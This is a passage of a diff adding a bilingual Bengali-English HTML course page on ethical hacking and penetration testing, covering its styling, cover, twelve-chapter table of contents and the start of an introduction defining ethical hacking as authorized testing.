@@ -1,0 +1,1944 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ethical Hacking & Penetration Testing Roadmap</title>
+<link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@300;400;500;600;700&family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg: #0a0c10;
+  --surface: #0f1318;
+  --surface2: #151a22;
+  --border: #1e2a38;
+  --accent: #00ff88;
+  --accent2: #00c8ff;
+  --accent3: #ff4757;
+  --accent4: #ffa502;
+  --accent5: #a855f7;
+  --text: #c9d8e8;
+  --text-dim: #6b8299;
+  --text-bright: #e8f4ff;
+  --code-bg: #060810;
+  --green: #00ff88;
+  --red: #ff4757;
+  --blue: #00c8ff;
+  --yellow: #ffa502;
+  --purple: #a855f7;
+  --orange: #ff6b35;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+body {
+  font-family: 'Hind Siliguri', sans-serif;
+  background: var(--bg);
+  color: var(--text);
+  font-size: 14px;
+  line-height: 1.9;
+}
+
+/* ══ BILINGUAL ══ */
+.en-text { display: none; }
+.bn-text { display: inline; }
+body.lang-en .bn-text { display: none; }
+body.lang-en .en-text { display: inline; }
+.en-block { display: none; }
+.bn-block { display: block; }
+body.lang-en .bn-block { display: none; }
+body.lang-en .en-block { display: block; }
+
+/* ══ TOP CONTROLS ══ */
+.top-controls {
+  position: fixed; top: 16px; right: 16px;
+  display: flex; gap: 8px; z-index: 9999;
+}
+.ctrl-btn {
+  border: 1px solid var(--border);
+  padding: 8px 16px; border-radius: 6px;
+  font-size: 13px; font-family: 'Rajdhani', sans-serif;
+  cursor: pointer; font-weight: 600;
+  transition: all 0.2s; letter-spacing: 0.5px;
+}
+.print-btn { background: var(--accent3); color: #fff; border-color: var(--accent3); }
+.print-btn:hover { background: #e0001f; }
+.theme-btn { background: var(--surface2); color: var(--accent); border-color: var(--accent); }
+.theme-btn:hover { background: var(--accent); color: #000; }
+.lang-btn { background: var(--surface2); color: var(--accent2); border-color: var(--accent2); }
+.lang-btn:hover { background: var(--accent2); color: #000; }
+
+/* ══ LIGHT MODE ══ */
+body.light-mode {
+  --bg: #f0f4f8;
+  --surface: #ffffff;
+  --surface2: #e8eef5;
+  --border: #ccd8e5;
+  --text: #1a2535;
+  --text-dim: #5a7a95;
+  --text-bright: #0a1525;
+  --code-bg: #0d1117;
+  --accent: #00994d;
+  --accent2: #0077b6;
+  --accent3: #e63946;
+  --accent4: #e07b00;
+  --accent5: #7c3aed;
+}
+body.light-mode .chapter-header,
+body.light-mode .cover { filter: brightness(1.05); }
+body.light-mode .code { filter: brightness(1); }
+
+/* ══ COVER ══ */
+.cover {
+  min-height: 100vh;
+  background: linear-gradient(160deg, #000814 0%, #001f3f 40%, #0d1b2a 70%, #001a0a 100%);
+  display: flex; flex-direction: column;
+  align-items: center; justify-content: center;
+  text-align: center; padding: 80px 40px;
+  page-break-after: always; position: relative; overflow: hidden;
+}
+.cover::before {
+  content: '';
+  position: absolute; inset: 0;
+  background:
+    radial-gradient(ellipse 60% 40% at 20% 50%, rgba(0,255,136,0.05) 0%, transparent 60%),
+    radial-gradient(ellipse 50% 60% at 80% 30%, rgba(0,200,255,0.05) 0%, transparent 60%);
+}
+.cover-grid {
+  position: absolute; inset: 0;
+  background-image:
+    linear-gradient(rgba(0,255,136,0.04) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(0,255,136,0.04) 1px, transparent 1px);
+  background-size: 40px 40px;
+}
+.cover-badge {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 12px; color: var(--accent);
+  letter-spacing: 4px; text-transform: uppercase;
+  border: 1px solid rgba(0,255,136,0.3);
+  padding: 6px 20px; border-radius: 2px;
+  margin-bottom: 30px;
+  background: rgba(0,255,136,0.05);
+  position: relative;
+}
+.cover h1 {
+  font-family: 'Rajdhani', sans-serif;
+  font-size: 52px; font-weight: 700;
+  color: var(--accent);
+  text-shadow: 0 0 40px rgba(0,255,136,0.4), 0 0 80px rgba(0,255,136,0.15);
+  line-height: 1.1; margin-bottom: 10px;
+  position: relative;
+}
+.cover h2 {
+  font-size: 20px; font-weight: 400;
+  color: rgba(200,220,255,0.7);
+  margin-bottom: 30px; position: relative;
+}
+.cover-divider {
+  width: 100px; height: 2px;
+  background: linear-gradient(90deg, transparent, var(--accent), transparent);
+  margin: 20px auto 30px; position: relative;
+}
+.cover-desc {
+  font-size: 15px; color: rgba(180,210,240,0.65);
+  max-width: 640px; line-height: 2; margin-bottom: 35px;
+  position: relative;
+}
+.cover-terminal {
+  background: rgba(0,0,0,0.6);
+  border: 1px solid rgba(0,255,136,0.25);
+  border-radius: 8px; padding: 20px 28px;
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 13px; color: var(--accent);
+  text-align: left; max-width: 520px; width: 100%;
+  position: relative; margin-bottom: 30px;
+}
+.cover-terminal .t-bar {
+  display: flex; gap: 7px; margin-bottom: 14px;
+}
+.cover-terminal .dot {
+  width: 11px; height: 11px; border-radius: 50%;
+}
+.dot-r { background: #ff5f56; }
+.dot-y { background: #ffbd2e; }
+.dot-g { background: #27c93f; }
+.t-prompt { color: #00c8ff; }
+.t-out { color: rgba(200,230,200,0.8); font-size: 12px; }
+.cover-tags { display: flex; flex-wrap: wrap; gap: 8px; justify-content: center; position: relative; }
+.cover-tag {
+  font-family: 'Rajdhani', sans-serif;
+  font-size: 12px; font-weight: 600;
+  padding: 4px 14px; border-radius: 3px;
+  letter-spacing: 0.5px;
+}
+.tag-green { background: rgba(0,255,136,0.1); color: var(--accent); border: 1px solid rgba(0,255,136,0.25); }
+.tag-blue { background: rgba(0,200,255,0.1); color: var(--accent2); border: 1px solid rgba(0,200,255,0.25); }
+.tag-red { background: rgba(255,71,87,0.1); color: var(--accent3); border: 1px solid rgba(255,71,87,0.25); }
+.tag-yellow { background: rgba(255,165,2,0.1); color: var(--accent4); border: 1px solid rgba(255,165,2,0.25); }
+.tag-purple { background: rgba(168,85,247,0.1); color: var(--accent5); border: 1px solid rgba(168,85,247,0.25); }
+
+/* ══ TOC ══ */
+.toc {
+  background: var(--surface);
+  padding: 55px 65px; page-break-after: always;
+  border-top: 3px solid var(--accent);
+}
+.toc-header {
+  font-family: 'Rajdhani', sans-serif;
+  font-size: 28px; font-weight: 700;
+  color: var(--accent); margin-bottom: 35px;
+  padding-bottom: 15px;
+  border-bottom: 1px solid var(--border);
+  letter-spacing: 1px;
+}
+.toc-item {
+  display: flex; justify-content: space-between;
+  align-items: center; padding: 10px 0;
+  border-bottom: 1px solid var(--border);
+  gap: 15px;
+}
+.toc-item:hover { background: var(--surface2); padding-left: 8px; transition: all 0.2s; }
+.toc-num {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 12px; color: var(--accent);
+  min-width: 36px;
+}
+.toc-title {
+  flex: 1; font-size: 15px; font-weight: 600;
+  color: var(--text-bright);
+  font-family: 'Rajdhani', sans-serif; letter-spacing: 0.3px;
+}
+.toc-sub-title { font-size: 12.5px; color: var(--text-dim); font-weight: 400; font-family: 'Hind Siliguri', sans-serif; letter-spacing: 0; }
+.toc-tag {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 10px; padding: 2px 8px;
+  border-radius: 2px; white-space: nowrap;
+}
+
+/* ══ CHAPTERS ══ */
+.chapter { background: var(--surface); page-break-before: always; }
+.chapter-header {
+  padding: 45px 60px; position: relative; overflow: hidden;
+}
+.ch1 .chapter-header { background: linear-gradient(135deg, #000814, #001a0a); border-top: 3px solid var(--accent); }
+.ch2 .chapter-header { background: linear-gradient(135deg, #0a0014, #1a0028); border-top: 3px solid var(--accent5); }
+.ch3 .chapter-header { background: linear-gradient(135deg, #000d1a, #001f3f); border-top: 3px solid var(--accent2); }
+.ch4 .chapter-header { background: linear-gradient(135deg, #140000, #2e0000); border-top: 3px solid var(--accent3); }
+.ch5 .chapter-header { background: linear-gradient(135deg, #140a00, #2e1500); border-top: 3px solid var(--accent4); }
+.ch6 .chapter-header { background: linear-gradient(135deg, #0a001a, #1a003d); border-top: 3px solid var(--accent5); }
+.ch7 .chapter-header { background: linear-gradient(135deg, #001414, #002e2e); border-top: 3px solid var(--accent2); }
+.ch8 .chapter-header { background: linear-gradient(135deg, #0f0000, #280000); border-top: 3px solid var(--accent3); }
+.ch9 .chapter-header { background: linear-gradient(135deg, #001400, #002800); border-top: 3px solid var(--accent); }
+.ch10 .chapter-header { background: linear-gradient(135deg, #0a0a00, #1f1f00); border-top: 3px solid var(--accent4); }
+.ch11 .chapter-header { background: linear-gradient(135deg, #10001a, #200035); border-top: 3px solid var(--accent5); }
+.ch12 .chapter-header { background: linear-gradient(135deg, #000814, #001028); border-top: 3px solid var(--accent2); }
+
+.chapter-header::after {
+  content: attr(data-num);
+  position: absolute; right: 50px; top: 50%;
+  transform: translateY(-50%);
+  font-family: 'Rajdhani', sans-serif;
+  font-size: 100px; font-weight: 700;
+  opacity: 0.06; color: white; line-height: 1;
+}
+.chapter-label {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 11px; letter-spacing: 4px;
+  color: rgba(255,255,255,0.4);
+  text-transform: uppercase; margin-bottom: 10px;
+}
+.chapter-title {
+  font-family: 'Rajdhani', sans-serif;
+  font-size: 32px; color: white; font-weight: 700;
+  letter-spacing: 0.5px; line-height: 1.2;
+}
+.chapter-desc { font-size: 13.5px; color: rgba(255,255,255,0.5); margin-top: 8px; }
+.chapter-body { padding: 45px 60px; }
+
+/* ══ HEADINGS ══ */
+h2.sec {
+  font-family: 'Rajdhani', sans-serif;
+  font-size: 21px; font-weight: 700;
+  color: var(--accent); margin: 38px 0 16px;
+  padding-left: 14px;
+  border-left: 3px solid var(--accent);
+  letter-spacing: 0.5px;
+}
+h3.sub {
+  font-family: 'Rajdhani', sans-serif;
+  font-size: 16px; font-weight: 600;
+  color: var(--accent2); margin: 26px 0 12px;
+  padding-bottom: 6px;
+  border-bottom: 1px dashed var(--border);
+  letter-spacing: 0.3px;
+}
+h4.mini { font-size: 14px; color: var(--text-bright); margin: 16px 0 8px; font-weight: 600; }
+p { margin-bottom: 14px; text-align: justify; }
+
+/* ══ CODE ══ */
+.code {
+  background: var(--code-bg); color: #abb2bf;
+  padding: 18px 22px; border-radius: 8px;
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 12.5px; margin: 16px 0; line-height: 1.85;
+  overflow-x: auto; border: 1px solid #1e2a38;
+  border-left: 3px solid var(--accent);
+}
+.code .c { color: #5c6370; }
+.code .k { color: #e06c75; }
+.code .s { color: #98c379; }
+.code .p { color: var(--accent); }
+.code .g { color: var(--accent); }
+.code .y { color: #e5c07b; }
+.code .b { color: #61afef; }
+.code .r { color: #e06c75; }
+code {
+  background: #0d1117; color: #79c0ff;
+  padding: 2px 7px; border-radius: 4px;
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 12.5px;
+}
+
+/* ══ BOXES ══ */
+.box { padding: 16px 20px; border-radius: 8px; margin: 18px 0; border-left: 4px solid; }
+.info { background: rgba(0,200,255,0.07); border-color: var(--accent2); color: var(--accent2); }
+.warn { background: rgba(255,165,2,0.07); border-color: var(--accent4); color: var(--accent4); }
+.danger { background: rgba(255,71,87,0.07); border-color: var(--accent3); color: var(--accent3); }
+.success { background: rgba(0,255,136,0.07); border-color: var(--accent); color: var(--accent); }
+.purple-box { background: rgba(168,85,247,0.07); border-color: var(--accent5); color: var(--accent5); }
+.box-t { font-weight: 700; margin-bottom: 8px; font-size: 14px; font-family: 'Rajdhani', sans-serif; letter-spacing: 0.3px; }
+.box p, .box li { color: var(--text); }
+
+/* ══ TABLES ══ */
+table { width: 100%; border-collapse: collapse; margin: 18px 0; font-size: 13px; }
+thead tr { background: rgba(0,255,136,0.08); }
+th {
+  padding: 11px 14px; text-align: left; font-weight: 600;
+  color: var(--accent); border-bottom: 1px solid var(--border);
+  font-family: 'Rajdhani', sans-serif; letter-spacing: 0.3px; font-size: 13px;
+}
+td { padding: 9px 14px; border-bottom: 1px solid var(--border); color: var(--text); }
+tr:hover { background: rgba(0,255,136,0.04); }
+
+/* ══ GRID ══ */
+.grid2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin: 18px 0; }
+.grid3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 14px; margin: 18px 0; }
+.card {
+  background: var(--surface2); border: 1px solid var(--border);
+  border-radius: 8px; padding: 18px;
+}
+.card h4 {
+  font-family: 'Rajdhani', sans-serif;
+  color: var(--accent2); margin-bottom: 10px;
+  font-size: 14px; border-bottom: 1px solid var(--border);
+  padding-bottom: 6px; letter-spacing: 0.3px;
+}
+.card.red-card { border-color: rgba(255,71,87,0.3); }
+.card.red-card h4 { color: var(--accent3); }
+.card.green-card { border-color: rgba(0,255,136,0.3); }
+.card.green-card h4 { color: var(--accent); }
+.card.yellow-card { border-color: rgba(255,165,2,0.3); }
+.card.yellow-card h4 { color: var(--accent4); }
+.card.purple-card { border-color: rgba(168,85,247,0.3); }
+.card.purple-card h4 { color: var(--accent5); }
+
+/* ══ BADGE ══ */
+.badge { display: inline-block; padding: 2px 9px; border-radius: 3px; font-size: 11px; font-weight: 600; margin: 2px; font-family: 'Rajdhani', sans-serif; letter-spacing: 0.3px; }
+.badge-g { background: rgba(0,255,136,0.12); color: var(--accent); border: 1px solid rgba(0,255,136,0.25); }
+.badge-r { background: rgba(255,71,87,0.12); color: var(--accent3); border: 1px solid rgba(255,71,87,0.25); }
+.badge-b { background: rgba(0,200,255,0.12); color: var(--accent2); border: 1px solid rgba(0,200,255,0.25); }
+.badge-y { background: rgba(255,165,2,0.12); color: var(--accent4); border: 1px solid rgba(255,165,2,0.25); }
+.badge-p { background: rgba(168,85,247,0.12); color: var(--accent5); border: 1px solid rgba(168,85,247,0.25); }
+
+ul, ol { margin: 12px 0 12px 22px; line-height: 2; }
+li { margin-bottom: 3px; color: var(--text); }
+
+/* ══ DIAGRAM ══ */
+.diagram {
+  background: var(--code-bg); border: 1px solid var(--border);
+  border-radius: 8px; padding: 20px 24px;
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 12.5px; line-height: 1.9; margin: 18px 0;
+  color: #abb2bf; overflow-x: auto;
+}
+.dg { color: var(--accent); }
+.dy { color: var(--accent4); }
+.db { color: var(--accent2); }
+.dr { color: var(--accent3); }
+.dp { color: var(--accent5); }
+
+/* ══ ROADMAP PHASE ══ */
+.roadmap-phase {
+  display: flex; gap: 18px; margin-bottom: 28px; align-items: flex-start;
+}
+.phase-num {
+  min-width: 50px; height: 50px; border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  font-family: 'Rajdhani', sans-serif;
+  font-size: 18px; font-weight: 800; flex-shrink: 0;
+}
+.phase-content { flex: 1; }
+.phase-title {
+  font-family: 'Rajdhani', sans-serif;
+  font-size: 17px; font-weight: 700; margin-bottom: 6px;
+  letter-spacing: 0.3px;
+}
+.phase-desc { font-size: 13px; color: var(--text-dim); margin-bottom: 10px; }
+.phase-items { display: flex; flex-wrap: wrap; gap: 7px; }
+.phase-item {
+  padding: 4px 12px; border-radius: 3px;
+  font-size: 12px; font-weight: 600; border: 1px solid currentColor;
+  font-family: 'Rajdhani', sans-serif; letter-spacing: 0.3px;
+}
+.roadmap-connector { text-align: center; font-size: 24px; color: var(--accent); margin: -10px 0 8px 25px; opacity: 0.5; }
+
+/* ══ CHAPTER SUMMARY ══ */
+.ch-summary {
+  background: linear-gradient(135deg, var(--surface2), var(--surface));
+  border: 1px solid var(--border); border-top: 3px solid var(--accent);
+  border-radius: 8px; padding: 24px 28px; margin-top: 40px;
+}
+.ch-summary h3 {
+  font-family: 'Rajdhani', sans-serif;
+  color: var(--accent); font-size: 17px;
+  margin-bottom: 14px; letter-spacing: 0.3px;
+}
+.ch-summary li { color: var(--text); }
+
+/* ══ CHEAT SHEET ══ */
+.cheat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; margin: 18px 0; }
+.cheat-card {
+  background: var(--surface2); border: 1px solid var(--border);
+  border-radius: 8px; overflow: hidden;
+}
+.cheat-header {
+  padding: 9px 14px; font-weight: 700; font-size: 13px;
+  font-family: 'Rajdhani', sans-serif; letter-spacing: 0.5px; color: #000;
+}
+.cheat-row { display: flex; padding: 5px 12px; border-bottom: 1px solid var(--border); font-size: 12px; gap: 10px; align-items: flex-start; }
+.cheat-row:last-child { border-bottom: none; }
+.cheat-cmd { font-family: 'Share Tech Mono', monospace; color: var(--accent); font-weight: 600; min-width: 170px; white-space: nowrap; font-size: 11.5px; }
+.cheat-desc { color: var(--text-dim); font-size: 12px; }
+
+/* ══ PHASE COLORS ══ */
+.p-green { background: rgba(0,255,136,0.1); color: var(--accent); border-color: rgba(0,255,136,0.3); }
+.p-blue { background: rgba(0,200,255,0.1); color: var(--accent2); border-color: rgba(0,200,255,0.3); }
+.p-red { background: rgba(255,71,87,0.1); color: var(--accent3); border-color: rgba(255,71,87,0.3); }
+.p-yellow { background: rgba(255,165,2,0.1); color: var(--accent4); border-color: rgba(255,165,2,0.3); }
+.p-purple { background: rgba(168,85,247,0.1); color: var(--accent5); border-color: rgba(168,85,247,0.3); }
+
+.hl {
+  background: rgba(255,165,2,0.07); border: 1px solid rgba(255,165,2,0.2);
+  padding: 14px 18px; border-radius: 8px; margin: 16px 0;
+  color: var(--text);
+}
+
+/* ══ PROGRESS BAR ══ */
+.skill-bar { margin: 8px 0; }
+.skill-label { display: flex; justify-content: space-between; font-size: 12.5px; margin-bottom: 4px; color: var(--text); }
+.skill-track { background: var(--border); border-radius: 2px; height: 6px; }
+.skill-fill { height: 6px; border-radius: 2px; }
+
+/* ══ ATTACK CHAIN ══ */
+.attack-chain { display: flex; align-items: center; gap: 0; margin: 20px 0; overflow-x: auto; padding-bottom: 8px; }
+.chain-step {
+  min-width: 110px; padding: 12px 14px; text-align: center;
+  font-family: 'Rajdhani', sans-serif; font-size: 12px; font-weight: 700;
+  letter-spacing: 0.3px; flex-shrink: 0;
+}
+.chain-arrow { color: rgba(255,255,255,0.3); font-size: 18px; flex-shrink: 0; }
+
+/* ══ TOOL CARD ══ */
+.tool-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin: 16px 0; }
+.tool-card {
+  background: var(--surface2); border: 1px solid var(--border);
+  border-radius: 8px; padding: 14px;
+  transition: border-color 0.2s;
+}
+.tool-card:hover { border-color: var(--accent); }
+.tool-name {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 13px; color: var(--accent); margin-bottom: 4px;
+}
+.tool-cat { font-size: 10px; color: var(--text-dim); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 6px; }
+.tool-desc { font-size: 12px; color: var(--text); line-height: 1.6; }
+
+@media (max-width: 768px) {
+  .grid2, .grid3, .cheat-grid, .tool-grid { grid-template-columns: 1fr; }
+  .chapter-body, .chapter-header { padding: 25px 20px; }
+  .toc { padding: 30px 20px; }
+  .attack-chain { flex-wrap: wrap; }
+}
+@media print {
+  .top-controls { display: none; }
+  body { background: white; }
+  .cover, .chapter-header { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+  .code, .diagram { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+}
+</style>
+</head>
+<body>
+
+<div class="top-controls">
+  <button class="print-btn ctrl-btn" onclick="window.print()">🖨️ PDF</button>
+  <button class="theme-btn ctrl-btn" onclick="toggleTheme()" id="themeBtn">☀️ Light</button>
+  <button class="lang-btn ctrl-btn" onclick="toggleLang()" id="langBtn">🇬🇧 English</button>
+</div>
+
+<!-- ══ COVER ══ -->
+<div class="cover">
+  <div class="cover-grid"></div>
+  <div class="cover-badge">// COMPLETE ROADMAP v1.0 //</div>
+  <h1>ETHICAL HACKING</h1>
+  <h1 style="font-size:36px; margin-top:-10px; color: var(--accent2);">& PENETRATION TESTING</h1>
+  <h2><span class="bn-text">সম্পূর্ণ বাংলা রোডম্যাপ ও গাইড</span><span class="en-text">Complete Roadmap & Guide</span></h2>
+  <div class="cover-divider"></div>
+  <p class="cover-desc">
+    <span class="bn-text">Reconnaissance থেকে Reporting পর্যন্ত — Ethical Hacking-এর A থেকে Z, বাংলায় সম্পূর্ণ রোডম্যাপ, চিট শিট, এবং হাতে-কলমে গাইড।</span>
+    <span class="en-text">From Reconnaissance to Reporting — A to Z of Ethical Hacking, with a complete roadmap, cheat sheets, and hands-on guide.</span>
+  </p>
+  <div class="cover-terminal">
+    <div class="t-bar">
+      <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+    </div>
+    <div><span class="t-prompt">hacker@kali</span>:~# <span style="color:#e5c07b;">whoami</span></div>
+    <div class="t-out"><span class="bn-text">ethical_hacker_in_training</span><span class="en-text">ethical_hacker_in_training</span></div>
+    <div style="margin-top:6px"><span class="t-prompt">hacker@kali</span>:~# <span style="color:#e5c07b;">cat goal.txt</span></div>
+    <div class="t-out"><span class="bn-text">শিখো → বোঝো → ভাঙো → রক্ষা করো</span><span class="en-text">Learn → Understand → Break → Protect</span></div>
+    <div style="margin-top:6px"><span class="t-prompt">hacker@kali</span>:~# <span style="color:#e5c07b;">./start_journey.sh</span></div>
+    <div class="t-out" style="color: var(--accent);">[+] <span class="bn-text">রোডম্যাপ লোড হচ্ছে...</span><span class="en-text">Loading roadmap...</span></div>
+  </div>
+  <div class="cover-tags">
+    <span class="cover-tag tag-green">🕵️ Reconnaissance</span>
+    <span class="cover-tag tag-blue">🔍 Scanning</span>
+    <span class="cover-tag tag-red">💥 Exploitation</span>
+    <span class="cover-tag tag-yellow">⬆️ Privilege Escalation</span>
+    <span class="cover-tag tag-purple">🔒 Post-Exploitation</span>
+    <span class="cover-tag tag-green">📝 Reporting</span>
+    <span class="cover-tag tag-blue">🌐 Web App Testing</span>
+    <span class="cover-tag tag-red">📡 Network Hacking</span>
+    <span class="cover-tag tag-yellow">🛠️ Tools & Frameworks</span>
+    <span class="cover-tag tag-purple">📋 Cheat Sheets</span>
+  </div>
+</div>
+
+<!-- ══ TOC ══ -->
+<div class="toc">
+  <div class="toc-header">// <span class="bn-text">বিষয়সূচি</span><span class="en-text">TABLE OF CONTENTS</span> //</div>
+
+  <div class="toc-item">
+    <span class="toc-num">01</span>
+    <div style="flex:1">
+      <div class="toc-title"><span class="bn-text">Ethical Hacking পরিচিতি ও রোডম্যাপ</span><span class="en-text">Intro to Ethical Hacking & Roadmap</span></div>
+      <div class="toc-sub-title"><span class="bn-text">Hacking কী, Legal Framework, Career Path, Mindset</span><span class="en-text">What is Hacking, Legal Framework, Career Path, Mindset</span></div>
+    </div>
+    <span class="toc-tag badge-g">FOUNDATION</span>
+  </div>
+
+  <div class="toc-item">
+    <span class="toc-num">02</span>
+    <div style="flex:1">
+      <div class="toc-title"><span class="bn-text">Reconnaissance — তথ্য সংগ্রহ</span><span class="en-text">Reconnaissance — Information Gathering</span></div>
+      <div class="toc-sub-title"><span class="bn-text">Passive vs Active Recon, OSINT, Google Dorks, Shodan</span><span class="en-text">Passive vs Active Recon, OSINT, Google Dorks, Shodan</span></div>
+    </div>
+    <span class="toc-tag badge-b">RECON</span>
+  </div>
+
+  <div class="toc-item">
+    <span class="toc-num">03</span>
+    <div style="flex:1">
+      <div class="toc-title"><span class="bn-text">Scanning & Enumeration</span><span class="en-text">Scanning & Enumeration</span></div>
+      <div class="toc-sub-title"><span class="bn-text">Nmap, Masscan, Nikto, Banner Grabbing, Service Detection</span><span class="en-text">Nmap, Masscan, Nikto, Banner Grabbing, Service Detection</span></div>
+    </div>
+    <span class="toc-tag badge-b">SCAN</span>
+  </div>
+
+  <div class="toc-item">
+    <span class="toc-num">04</span>
+    <div style="flex:1">
+      <div class="toc-title"><span class="bn-text">Vulnerability Assessment</span><span class="en-text">Vulnerability Assessment</span></div>
+      <div class="toc-sub-title"><span class="bn-text">CVE, CVSS, OpenVAS, Nessus, Manual Analysis</span><span class="en-text">CVE, CVSS, OpenVAS, Nessus, Manual Analysis</span></div>
+    </div>
+    <span class="toc-tag badge-r">VULN</span>
+  </div>
+
+  <div class="toc-item">
+    <span class="toc-num">05</span>
+    <div style="flex:1">
+      <div class="toc-title"><span class="bn-text">Exploitation — দুর্বলতা কাজে লাগানো</span><span class="en-text">Exploitation — Taking Advantage of Vulnerabilities</span></div>
+      <div class="toc-sub-title"><span class="bn-text">Metasploit, Manual Exploits, Buffer Overflow, CVE Exploit</span><span class="en-text">Metasploit, Manual Exploits, Buffer Overflow, CVE Exploit</span></div>
+    </div>
+    <span class="toc-tag badge-r">EXPLOIT</span>
+  </div>
+
+  <div class="toc-item">
+    <span class="toc-num">06</span>
+    <div style="flex:1">
+      <div class="toc-title"><span class="bn-text">Post-Exploitation & Privilege Escalation</span><span class="en-text">Post-Exploitation & Privilege Escalation</span></div>
+      <div class="toc-sub-title"><span class="bn-text">Persistence, Lateral Movement, Data Exfiltration</span><span class="en-text">Persistence, Lateral Movement, Data Exfiltration</span></div>
+    </div>
+    <span class="toc-tag badge-p">POST-EX</span>
+  </div>
+
+  <div class="toc-item">
+    <span class="toc-num">07</span>
+    <div style="flex:1">
+      <div class="toc-title"><span class="bn-text">Web Application Hacking</span><span class="en-text">Web Application Hacking</span></div>
+      <div class="toc-sub-title"><span class="bn-text">OWASP Top 10, SQLi, XSS, SSRF, Burp Suite Workflow</span><span class="en-text">OWASP Top 10, SQLi, XSS, SSRF, Burp Suite Workflow</span></div>
+    </div>
+    <span class="toc-tag badge-b">WEB</span>
+  </div>
+
+  <div class="toc-item">
+    <span class="toc-num">08</span>
+    <div style="flex:1">
+      <div class="toc-title"><span class="bn-text">Network Hacking & Wireless</span><span class="en-text">Network Hacking & Wireless</span></div>
+      <div class="toc-sub-title"><span class="bn-text">MITM, ARP Spoofing, WiFi Cracking, WPA2 Attack</span><span class="en-text">MITM, ARP Spoofing, WiFi Cracking, WPA2 Attack</span></div>
+    </div>
+    <span class="toc-tag badge-y">NETWORK</span>
+  </div>
+
+  <div class="toc-item">
+    <span class="toc-num">09</span>
+    <div style="flex:1">
+      <div class="toc-title"><span class="bn-text">Password Attacks & Cracking</span><span class="en-text">Password Attacks & Cracking</span></div>
+      <div class="toc-sub-title"><span class="bn-text">Hashcat, John, Hydra, Rainbow Tables, Wordlists</span><span class="en-text">Hashcat, John, Hydra, Rainbow Tables, Wordlists</span></div>
+    </div>
+    <span class="toc-tag badge-r">CRACK</span>
+  </div>
+
+  <div class="toc-item">
+    <span class="toc-num">10</span>
+    <div style="flex:1">
+      <div class="toc-title"><span class="bn-text">Social Engineering</span><span class="en-text">Social Engineering</span></div>
+      <div class="toc-sub-title"><span class="bn-text">Phishing, Vishing, Pretexting, SET Framework</span><span class="en-text">Phishing, Vishing, Pretexting, SET Framework</span></div>
+    </div>
+    <span class="toc-tag badge-p">SOCIAL</span>
+  </div>
+
+  <div class="toc-item">
+    <span class="toc-num">11</span>
+    <div style="flex:1">
+      <div class="toc-title"><span class="bn-text">Reporting & Documentation</span><span class="en-text">Reporting & Documentation</span></div>
+      <div class="toc-sub-title"><span class="bn-text">Pentest Report লেখা, CVSS Scoring, Executive Summary</span><span class="en-text">Writing Pentest Reports, CVSS Scoring, Executive Summary</span></div>
+    </div>
+    <span class="toc-tag badge-g">REPORT</span>
+  </div>
+
+  <div class="toc-item">
+    <span class="toc-num">12</span>
+    <div style="flex:1">
+      <div class="toc-title"><span class="bn-text">Cheat Sheet — সম্পূর্ণ রেফারেন্স</span><span class="en-text">Cheat Sheet — Complete Reference</span></div>
+      <div class="toc-sub-title"><span class="bn-text">Nmap, Metasploit, SQLi, XSS, Reverse Shell — সব কমান্ড</span><span class="en-text">Nmap, Metasploit, SQLi, XSS, Reverse Shell — All Commands</span></div>
+    </div>
+    <span class="toc-tag badge-y">CHEAT</span>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     CHAPTER 1: INTRO & ROADMAP
+══════════════════════════════════════ -->
+<div class="chapter ch1">
+  <div class="chapter-header" data-num="01">
+    <div class="chapter-label">CHAPTER 01</div>
+    <div class="chapter-title">🎯 <span class="bn-text">Ethical Hacking পরিচিতি ও সম্পূর্ণ রোডম্যাপ</span><span class="en-text">Intro to Ethical Hacking & Complete Roadmap</span></div>
+    <div class="chapter-desc"><span class="bn-text">Hacking কী, কেন শিখবে, Career Path এবং Ethical Hacker-এর Mindset</span><span class="en-text">What is Hacking, why learn it, Career Path, and Ethical Hacker Mindset</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">Ethical Hacking কী?</span><span class="en-text">What is Ethical Hacking?</span></h2>
+    <p><span class="bn-text">Ethical Hacking হলো একজন authorized ব্যক্তির দ্বারা কোনো সিস্টেম, নেটওয়ার্ক বা অ্যাপ্লিকেশনের দুর্বলতা খুঁজে বের করার প্রক্রিয়া — যাতে সেগুলো সংশোধন করা যায়। এটাকে <strong>Penetration Testing</strong> বা <strong>White Hat Hacking</strong>-ও বলা হয়।</span><span class="en-text">Ethical Hacking is the process by which an authorized individual identifies vulnerabilities in a system, network, or application — so that they can be fixed. It is also called <strong>Penetration Testing</strong> or <strong>White Hat Hacking</strong>.</span></p>
+
+    <div class="grid3">
+      <div class="card green-card">
+        <h4>🟢 White Hat</h4>
+        <p style="font-size:13px;"><span class="bn-text">অনুমতি নিয়ে সিস্টেম টেস্ট করে। Ethical Hacker। Legal।</span><span class="en-text">Tests systems with permission. Ethical Hacker. Legal.</span></p>
+      </div>
+      <div class="card yellow-card">
+        <h4>🟡 Grey Hat</h4>
